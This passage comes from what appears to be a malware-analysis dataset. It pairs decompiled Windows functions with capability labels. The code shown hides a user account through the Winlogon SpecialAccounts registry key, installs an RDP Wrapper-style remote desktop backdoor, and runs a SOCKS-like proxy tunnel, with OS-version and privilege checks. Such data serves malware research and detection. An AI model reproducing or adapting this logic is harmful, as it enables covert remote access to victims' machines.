*(param_1 + 0x4c));\n                        }\n                        (*pcVar6)();\n                        fcn.0040362d(param_1 + 0x28);\n                        fcn.0040d508(&stack0xffffff68);\n                        fcn.00405ea5();\n                        (*pcVar6)(500);\n                        iVar1 = fcn.0040d63b();\n                        if (iVar1 != 0) {\n                            iVar1 = fcn.0040fc58();\n                            if (iVar1 == 1) {\n                                fcn.0040f7b9();\n                            }\n                            uVar4 = fcn.00404b91(0, param_1 + 0x5c, param_1 + 0x60);\n                            fcn.00404f2b(uVar4);\n                            fcn.00404b6e();\n                            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(param_1);\n                            uVar4 = 8;\n                            goto code_r0x0040e2d5;\n                        }\n                        iVar1 = param_1 + 0x60;\n                        iVar2 = param_1 + 0x5c;\n                        in_stack_ffffff58 = 7;\n                    }\n                }\n            }\n        }\n        uVar3 = fcn.00404b91(in_stack_ffffff58, iVar2, iVar1);\n        fcn.00404f2b(uVar3);\n        fcn.00404b6e();\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(param_1);\n    }\ncode_r0x0040e2d5:\n    fcn.00403036();\n    return uVar4;\n}\n",
        "token_count": 1796
    },
    "0040e3fa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e3fa(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint uVar6;\n    char16_t *pcVar7;\n    uint lpCriticalSection;\n    uint var_20h;\n    uint var_10h;\n    uint lpData;\n    uint hKey;\n    \n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(&lpCriticalSection);\n    puVar4 = &lpCriticalSection;\n    puVar5 = 0x54e020;\n    for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(&lpCriticalSection);\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x54e020);\n    *0x54e084 = arg_8h;\n    *0x54e078 = 0x54d000;\n    *0x54e074 = arg_ch;\n    iVar3 = fcn.0040de1f();\n    if (iVar3 == 0) {\n        uVar2 = fcn.0040f51d();\n        if ((uVar2 < 6) || (iVar3 = fcn.0040f4ce(),  iVar3 != 0)) {\n            uVar1 = fcn.00404b91(2, 0x54e07c, 0x54e080);\n            fcn.00404f2b(uVar1);\n            fcn.00404b6e();\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x54e020);\n            return 0;\n        }\n        iVar3 = fcn.0040fbfc();\n        if (iVar3 == 1) {\n            uVar1 = fcn.004034a7();\n            fcn.00403437(uVar1);\n            fcn.00405ea5();\n            uVar1 = fcn.004034a7();\n            fcn.00403437(uVar1);\n            fcn.00405ea5();\n            uVar1 = 0;\n            (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)\n                      (0x80000002, \n                       \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList\", 0, 0, 0, \n                       0xf013f, 0, &hKey, &var_10h);\n            lpData = 0;\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, *0x54e07c, 0, 4, &lpData, 4);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            iVar3 = fcn.0040d418(0x54e07c, 0x54e080);\n            if (iVar3 != 0) {\n                uVar6 = 0x54e07c;\n                pcVar7 = L\"rudp\";\n                uVar1 = fcn.004035e5(L\"rudp\");\n                fcn.0041165b(uVar1, pcVar7);\n                fcn.00405ea5(uVar1, pcVar7, uVar6);\n                uVar6 = 0x54e080;\n                pcVar7 = L\"rpdp\";\n                uVar1 = fcn.004035e5(L\"rpdp\");\n                fcn.0041165b(uVar1, pcVar7);\n                fcn.00405ea5(uVar1, pcVar7, uVar6);\n                fcn.00401f4b(fcn.0040e2e7, 0x54e020);\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x54e020);\n                return 1;\n            }\n            uVar6 = fcn.00404b91(9, 0x54e07c, 0x54e080);\n            fcn.00404f2b(uVar6);\n            fcn.00404b6e();\n        }\n        else {\n            uVar1 = fcn.00404b91(1, 0x54e07c, 0x54e080);\n            fcn.00404f2b(uVar1);\n            fcn.00404b6e();\n            uVar1 = 0;\n        }\n    }\n    else {\n        uVar1 = fcn.004035e5(L\"rudp\");\n        uVar1 = fcn.0041168e(&arg_ch, uVar1);\n        fcn.00403437(uVar1);\n        fcn.00405ea5();\n        arg_ch = 0;\n        fcn.00405ea5();\n        uVar1 = fcn.004035e5(L\"rpdp\");\n        uVar1 = fcn.0041168e(&arg_ch, uVar1);\n        fcn.00403437(uVar1);\n        fcn.00405ea5();\n        arg_ch = 0;\n        fcn.00405ea5();\n        iVar3 = fcn.00403261();\n        if ((iVar3 == 0) && (iVar3 = fcn.00403261(),  iVar3 == 0)) {\n            fcn.004035e5(0x414648);\n            uVar6 = 0x414648;\n            uVar1 = fcn.004035e5(0x414648);\n            uVar1 = fcn.00404b91(8, uVar1, uVar6);\n            fcn.00404f2b(uVar1);\n            fcn.00404b6e();\n            fcn.00405ea5();\n            arg_ch = 0;\n            fcn.00405ea5();\n        }\n        else {\n            uVar1 = fcn.00404b91(8, 0x54e07c, 0x54e080);\n            fcn.00404f2b(uVar1);\n            fcn.00404b6e();\n        }\n        uVar1 = 1;\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x54e020);\n    return uVar1;\n}\n",
        "token_count": 1421
    },
    "0040e703": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0040e703(void)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x54e020);\n    *0x54e070 = 5;\n    *0x54e068 = 5;\n    *0x54e038 = ZEXT816(0);\n    *0x54e048 = 0;\n    *0x54e050 = ZEXT816(0);\n    *0x54e060 = 0;\n    *0x54e06c = 0;\n    puVar1 = fcn.00405f53();\n    if (puVar1 == NULL) {\n        *0x54e064 = NULL;\n    }\n    else {\n        *puVar1 = 5;\n        *0x54e064 = puVar1 + 1;\n        **0x54e064 = 0;\n        puVar1[2] = 0;\n        puVar1[3] = 0;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n    }\n    *0x54e07c = 0;\n    *0x54e080 = 0;\n    fcn.004032ff(L\"TermService\");\n    fcn.004032ff(L\"%ProgramFiles%\");\n    fcn.004035e5(L\"%windir%\\\\System32\");\n    uVar2 = fcn.004031d4();\n    fcn.00403437(uVar2);\n    fcn.00405ea5();\n    fcn.00405ea5();\n    iVar3 = fcn.0040fc58();\n    if (iVar3 == 1) {\n        fcn.004032ff(L\"%ProgramW6432%\");\n        uVar2 = fcn.004031d4();\n        fcn.00403437(uVar2);\n        fcn.00405ea5();\n        fcn.004032ff(L\"%ProgramFiles%\");\n    }\n    else {\n        uVar2 = fcn.004031d4();\n        fcn.00403437(uVar2);\n        fcn.00405ea5();\n    }\n    fcn.0040346a(L\"\\\\Microsoft DN1\");\n    fcn.0040346a(L\"\\\\Microsoft DN1\");\n    fcn.0040346a(L\"\\\\rfxvmt.dll\");\n    fcn.0040f71f();\n    fcn.00403437(0x54e058);\n    fcn.0040346a(L\"\\\\rdpwrap.ini\");\n    fcn.0040346a(L\"\\\\sqlmap.dll\");\n    fcn.0040346a(L\"\\\\sqlmap.dll\");\n    return 0x54e020;\n}\n",
        "token_count": 623
    },
    "0040e92a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040e92a(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uStack16;\n    uint uStack12;\n    \n    uStack16 = *(arg_8h + 4);\n    uStack12 = *(arg_8h + 0x10);\n    do {\n        iVar1 = fcn.0040e996();\n        if (iVar1 < 1) goto code_r0x0040e985;\n        iVar1 = (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &uStack16, 0, *(arg_8h + 0x1c));\n        if (iVar1 == 0) {\n            iVar1 = fcn.0040e996();\n            if (0 < iVar1) {\n                iVar1 = 0;\n            }\n            goto code_r0x0040e985;\n        }\n    } while (iVar1 != 1);\n    iVar1 = 1;\ncode_r0x0040e985:\n    fcn.0040ea89();\n    return iVar1;\n}\n",
        "token_count": 241
    },
    "0040ea89": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040ea89(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = param_1 + 0x14;\n    if (*piVar1 != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar2 != *(param_1 + 0x18)) {\n            if (*(param_1 + 0x10) == 0) {\n                return;\n            }\n            (*_sym.imp.KERNEL32.dll_SetEvent)(*(param_1 + 0x10));\n            iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*piVar1, 5000);\n            if (iVar2 == 0x102) {\n                (*_sym.imp.KERNEL32.dll_TerminateThread)(*piVar1, 0xfffffffe);\n            }\n        }\n        fcn.0040ec8c();\n    }\n    fcn.0040ec8c();\n    fcn.0040ec8c();\n    fcn.0040ec8c();\n    fcn.0040ec8c();\n    *(param_1 + 0x18) = 0;\n    return;\n}\n",
        "token_count": 274
    },
    "0040ec8c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040ec8c(int32_t *param_1)\n\n{\n    if (*param_1 != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*param_1);\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 63
    },
    "0040ecd0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ecd0(uint arg_8h)\n\n{\n    uint in_ECX;\n    uint uVar1;\n    uint var_4h;\n    \n    if (*0x419564 == 0) {\n        uVar1 = 0;\n        var_4h = in_ECX;\n    }\n    else {\n        fcn.0040315f();\n        var_4h = 0;\n        uVar1 = fcn.0040308c(&var_4h, 0);\n        uVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(*0x419564, arg_8h, uVar1);\n    }\n    fcn.00405ea5();\n    return uVar1;\n}\n",
        "token_count": 160
    },
    "0040ee9a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040ee9a(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_818h;\n    uint name;\n    uint var_ch;\n    \n    uVar1 = (*_sym.imp.WS2_32.dll_socket)(2, 1, 6);\n    iVar2 = (*_sym.imp.WS2_32.dll_gethostbyname)(param_1);\n    fcn.0040102c(&var_ch, **(iVar2 + 0xc), *(iVar2 + 10));\n    name._0_2_ = 2;\n    name._2_2_ = (*_sym.imp.WS2_32.dll_htons)(param_2);\n    fcn.00401052(&var_818h, 0, 0x802);\n    (*_sym.imp.WS2_32.dll_InetNtopW)(2, &var_ch, &var_818h, 0x802);\n    while (*0x419695 == '\\0') {\n        iVar2 = (*_sym.imp.WS2_32.dll_connect)(uVar1, &name, 0x10);\n        if (iVar2 != -1) {\n            *0x419695 = '\\x01';\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 301
    },
    "0040ef4f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040ef4f(uint param_1)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint var_868h;\n    uint var_60h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_30h;\n    uint uStack48;\n    ushort uStack44;\n    uint lpThreadId;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t len;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    *0x4198b4 = param_1;\n    do {\n        while( true ) {\n            piVar4 = fcn.0040f23d(&var_60h);\n            var_1ch = *piVar4;\n            len = piVar4[1];\n            var_14h = piVar4[2];\n            if (*0x419695 == '\\0') {\n                return;\n            }\n            var_1h._0_1_ = '\\0';\n            piVar4 = fcn.00405f53();\n            iVar5 = var_14h;\n            if (piVar4 == NULL) {\n                piVar4 = NULL;\n            }\n            else {\n                *piVar4 = 0;\n                piVar4[1] = 0;\n                piVar4[2] = 0;\n            }\n            iVar3 = var_1ch * 0xc;\n            piVar1 = iVar3 + 0x4198c0;\n            cVar2 = var_1h;\n            if (*piVar1 == var_1ch) {\n                piVar4 = piVar1;\n                cVar2 = '\\x01';\n            }\n            if (cVar2 != '\\0') break;\n            var_8h._0_2_ = 5;\n            fcn.0040f1da(2, var_1ch);\n            *(piVar4 + 1) = 1;\n            *piVar4 = var_1ch;\n            *piVar1 = *piVar4;\n            *(iVar3 + 0x4198c4) = piVar4[1];\n            *(iVar3 + 0x4198c8) = piVar4[2];\n        }\n        if (*(piVar4 + 1) == '\\x01') {\n            fcn.00401052(&var_868h, 0, 0x802);\n            var_10h = 0;\n            var_ch = 0;\n            puVar6 = &var_50h;\n            for (iVar5 = 8; iVar3 = var_14h,  iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            var_30h = 0;\n            uStack48 = 0;\n            uStack44 = 0;\n            cVar2 = *(var_14h + 3);\n            if (cVar2 == '\\x01') {\n                (*_sym.imp.WS2_32.dll_InetNtopW)(2, var_14h + 4, &var_868h, 0x802);\ncode_r0x0040f024:\n                var_ch = fcn.0040f3bd();\n            }\n            else if (cVar2 == '\\x03') {\n                fcn.00401052(&var_50h, 0, 0x20);\n                var_4ch = 2;\n                var_48h = 1;\n                var_44h = 6;\n                iVar5 = fcn.00401085(0x200);\n                fcn.0040102c(iVar5, iVar3 + 5, *(iVar3 + 4));\n                var_20h = 0;\n                fcn.0040102c(*(iVar3 + 4) + iVar5, &var_20h, 1);\n                iVar5 = (*_sym.imp.WS2_32.dll_getaddrinfo)(iVar5, 0, &var_50h, &var_10h);\n                if (iVar5 == 0) goto code_r0x0040f024;\n            }\n            else if (cVar2 == '\\x04') {\n                (*_sym.imp.WS2_32.dll_InetNtopW)(0x17, var_14h + 4, &var_868h, 0x802);\n                var_ch = fcn.0040f33c();\n            }\n            var_30h = CONCAT22(var_30h._2_2_, 5);\n            var_30h = CONCAT13(1, var_30h);\n            fcn.0040f1da(10, var_1ch);\n            iVar5 = *piVar4 * 0xc;\n            piVar4[2] = var_ch;\n            *(piVar4 + 1) = 2;\n            lpThreadId = 0;\n            *(iVar5 + 0x4198c0) = *piVar4;\n            *(iVar5 + 0x4198c4) = piVar4[1];\n            *(iVar5 + 0x4198c8) = piVar4[2];\n            (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040f16e, piVar4, 0, &lpThreadId);\n            iVar5 = var_14h;\n        }\n        else {\n            (*_sym.imp.WS2_32.dll_send)(piVar4[2], var_14h, len, 0);\n        }\n        fcn.00401099(iVar5);\n    } while( true );\n}\n",
        "token_count": 1341
    },
    "0040f16e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f16e(uint *arg_8h)\n\n{\n    uint arg_ch;\n    uint uVar1;\n    uint uVar2;\n    int32_t arg_8h_00;\n    \n    arg_ch = *arg_8h;\n    uVar1 = arg_8h[2];\n    if (*0x419695 != '\\0') {\n        do {\n            uVar2 = fcn.00401085(0x2000);\n            arg_8h_00 = (*_sym.imp.WS2_32.dll_recv)(uVar1, uVar2, 8000, 0);\n            if ((arg_8h_00 == -1) || (arg_8h_00 == 0)) {\n                (*_sym.imp.WS2_32.dll_closesocket)(uVar1);\n                fcn.00401099(uVar2);\n                return;\n            }\n            fcn.0040f1da(arg_8h_00, arg_ch);\n            fcn.00401099(uVar2);\n        } while (*0x419695 != '\\0');\n    }\n    return;\n}\n",
        "token_count": 247
    },
    "0040f4ce": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040f4ce(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint var_11ch;\n    uint var_2h;\n    \n    var_11ch = 0x11c;\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x416dd0);\n    if (iVar1 != 0) {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"RtlGetVersion\");\n        if (pcVar2 == NULL) {\n            return 0;\n        }\n        (*pcVar2)(&var_11ch);\n    }\n    if ((var_2h != '\\x02') && (var_2h != '\\x03')) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 205
    },
    "0040f51d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.0040f51d(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint var_11ch;\n    uint var_118h;\n    int32_t var_10ch;\n    \n    var_11ch = 0x11c;\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x416dd0);\n    if (iVar1 != 0) {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"RtlGetVersion\");\n        if (pcVar2 == NULL) {\n            return 0;\n        }\n        (*pcVar2)(&var_11ch);\n    }\n    if (var_10ch != 2) {\n        return 0;\n    }\n    return var_118h;\n}\n",
        "token_count": 178
    },
    "0040f731": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040f731(uint param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    int32_t hKey;\n    \n    hKey = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(param_1, *param_2, 0, 0x20019, &hKey);\n    if (iVar1 == 2) {\n        return 0;\n    }\n    if (hKey != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    }\n    return 1;\n}\n",
        "token_count": 138
    },
    "0040f80e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040f80e(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    uint pvarg;\n    uint var_20h;\n    uint var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    int32_t *ppv;\n    \n    (*_sym.imp.ole32.dll_CoInitializeSecurity)(0, 0xffffffff, 0, 0, 0, 3, 0, 0, 0);\n    iVar1 = (*_sym.imp.ole32.dll_CoInitialize)(0);\n    if (-1 < iVar1) {\n        ppv = NULL;\n        iVar1 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x414490, 0, 0x17, 0x416e60, &ppv);\n        if (-1 < iVar1) {\n            var_10h = NULL;\n            iVar1 = (**(*ppv + 0xc))(ppv, L\"root\\\\CIMV2\", 0, 0, 0, 0x80, 0, 0, &var_10h);\n            piVar2 = ppv;\n            if (-1 < iVar1) {\n                var_ch = NULL;\n                iVar1 = (**(*var_10h + 0x50))\n                                  (var_10h, 0x416e58, L\"SELECT Name FROM Win32_VideoController\", 0x20, 0, &var_ch);\n                if (-1 < iVar1) {\n                    var_8h = NULL;\n                    while( true ) {\n                        iVar1 = (**(*var_ch + 0x10))(var_ch, 0xffffffff, 1, &var_8h, &var_14h);\n                        if ((iVar1 == 1) || (iVar1 < 0)) {\n                            (**(*var_ch + 8))(var_ch);\n                            (**(*var_10h + 8))(var_10h);\n                            uVar3 = (**(*ppv + 8))(ppv);\n                            return uVar3;\n                        }\n                        (*_sym.imp.OLEAUT32.dll_VariantClear)(&pvarg);\n                        iVar1 = (**(*var_8h + 0x10))(var_8h, L\"Name\", 0, &pvarg, 0, 0);\n                        if ((-1 < iVar1) && (pvarg == 8)) break;\n                        (**(*var_8h + 8))(var_8h);\n                    }\n                    goto code_r0x0040f885;\n                }\n                (**(*ppv + 8))(ppv);\n                piVar2 = var_10h;\n            }\n            (**(*piVar2 + 8))(piVar2);\n        }\n    }\n    var_20h = 0x414648;\ncode_r0x0040f885:\n    fcn.004035e5(var_20h);\n    return param_1;\n}\n",
        "token_count": 675
    },
    "0040fa42": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0040fa42(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint var_11ch;\n    int32_t var_118h;\n    int32_t var_114h;\n    int32_t var_10ch;\n    uint var_8h;\n    uint var_2h;\n    \n    var_11ch = 0x11c;\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x416dd0);\n    if (iVar1 != 0) {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"RtlGetVersion\");\n        if (pcVar2 == NULL) {\n            return 0;\n        }\n        (*pcVar2)(&var_11ch);\n    }\n    if (var_10ch == 2) {\n        if (var_2h == '\\x01') {\n            if (var_118h == 5) {\n                if (var_114h == 0) {\n                    return var_8h + 500;\n                }\n                if (var_114h == 1) {\n                    return var_8h + 0x1fe;\n                }\n                if (var_114h == 2) {\n                    return var_8h + 0x208;\n                }\n            }\n            else if (var_118h == 6) {\n                if (var_114h == 0) {\n                    return var_8h + 600;\n                }\n                if (var_114h == 1) {\n                    return var_8h + 0x262;\n                }\n                if (var_114h == 2) {\n                    return var_8h + 0x26c;\n                }\n                if (var_114h == 3) {\n                    return var_8h + 0x276;\n                }\n            }\n            else if ((var_118h == 10) && (var_114h == 0)) {\n                return var_8h + 1000;\n            }\n        }\n        else if ((var_2h == '\\x02') || (var_2h == '\\x03')) {\n            if (var_118h == 5) {\n                if (var_114h == 1) {\n                    return var_8h + 0x13ec;\n                }\n                if (var_114h == 2) {\n                    return var_8h + 0x1450;\n                }\n            }\n            else if (var_118h == 6) {\n                if (var_114h == 0) {\n                    return var_8h + 6000;\n                }\n                if (var_114h == 1) {\n                    return var_8h + 0x17d4;\n                }\n                if (var_114h == 2) {\n                    return var_8h + 0x1838;\n                }\n                if (var_114h == 3) {\n                    return var_8h + 0x189c;\n                }\n            }\n            else if ((var_118h == 10) && (var_114h == 0)) {\n                return var_8h + 10000;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 736
    },
    "0040fbfc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool fcn.0040fbfc(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t TokenInformation;\n    uint ReturnLength;\n    int32_t TokenHandle;\n    \n    TokenHandle = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &TokenHandle);\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar1);\n    iVar3 = 0;\n    if (iVar2 != 0) {\n        ReturnLength = 4;\n        iVar2 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x14, &TokenInformation, 4, &ReturnLength);\n        if (iVar2 != 0) {\n            iVar3 = TokenInformation;\n        }\n    }\n    if (TokenHandle != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n    }\n    return iVar3 != 0;\n}\n",
        "token_count": 220
    },
    "0040fe3d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040fe3d(uint arg_8h, uint nNumberOfBytesToRead, uint dwMoveMethod)\n\n{\n    uint arg_8h_00;\n    uint uVar1;\n    int32_t *in_ECX;\n    uint lpNumberOfBytesRead;\n    \n    if (*in_ECX != 0) {\n        fcn.0041026f();\n    }\n    lpNumberOfBytesRead = 0;\n    arg_8h_00 = fcn.00405eff();\n    (*_sym.imp.KERNEL32.dll_SetFilePointer)(in_ECX[2], 0, 0, dwMoveMethod);\n    uVar1 = (*_sym.imp.KERNEL32.dll_ReadFile)(in_ECX[2], arg_8h_00, nNumberOfBytesToRead, &lpNumberOfBytesRead, 0);\n    fcn.00402f91(arg_8h_00, nNumberOfBytesToRead);\n    fcn.00405eee();\n    if (*in_ECX != 0) {\n        (*_sym.imp.KERNEL32.dll_ReleaseMutex)(in_ECX[3]);\n    }\n    return uVar1;\n}\n",
        "token_count": 249
    },
    "00410125": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00410125(int32_t param_1)\n\n{\n    if (*(param_1 + 8) != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*(param_1 + 8));\n        *(param_1 + 8) = 0;\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "004104a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint16_t * __cdecl fcn.004104a0(uint16_t *arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    int32_t in_ECX;\n    uint16_t *puVar3;\n    int32_t in_EDX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t *piVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EDX != 0) {\n        do {\n            uVar2 = *arg_8h;\n            iVar4 = in_EDX + -1;\n            uVar1 = uVar2 >> 0xc;\n            piVar7 = (uVar2 & 0xfff) + in_ECX;\n            puVar3 = arg_8h;\n            if (uVar1 == 3) {\n                *piVar7 = *piVar7 + arg_ch;\n            }\n            else if (uVar1 == 1) {\n                *piVar7 = *piVar7 * 0x10000 + arg_ch >> 0x10;\n            }\n            else if (uVar1 == 4) 